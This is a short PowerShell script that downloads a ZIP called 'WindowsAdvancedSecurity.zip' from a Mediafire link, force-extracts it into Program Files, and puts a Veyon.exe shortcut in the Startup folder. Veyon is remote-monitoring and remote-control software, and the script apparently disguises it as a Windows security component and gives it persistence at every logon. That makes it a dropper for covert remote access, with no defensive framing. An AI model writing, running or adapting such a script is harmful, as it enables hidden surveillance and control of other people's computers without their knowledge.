# Download the ZIP file from Mediafire
$downloadLink = "https://download843.mediafire.com/pkakszg4bt5gqcA7HSen-Uf2caYzIYTFvCW2BsAgitxQIm3TjNlHJSgwmyih2FXgWsJ0BZ0cRJjDrkH190sukn12ShfzCSid6MeFPJDuTGpDcsUrLLcFOrj7BGRN0jVlqg7rrA5fbZwji2EZYdefJ8AghseIVWW2ZsH6hiv97g/s1m5k1yhrjbbpk0/WindowsAdvancedSecurity.zip"
$destinationPath = "C:\WindowsAdvancedSecurity.zip"
Invoke-WebRequest -Uri $downloadLink -OutFile $destinationPath

# Extract the ZIP to the desired directory using -Force
$extractToPath = "C:\Program Files\"
Expand-Archive -Path $destinationPath -DestinationPath $extractToPath -Force

# Create a shortcut for Veyon.exe and place it in the startup folder
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut("$($WScriptShell.SpecialFolders('Startup'))\Veyon.lnk")
$Shortcut.TargetPath = "C:\Program Files\WindowsAdvancedSecurity\Veyon.exe"
$Shortcut.Save()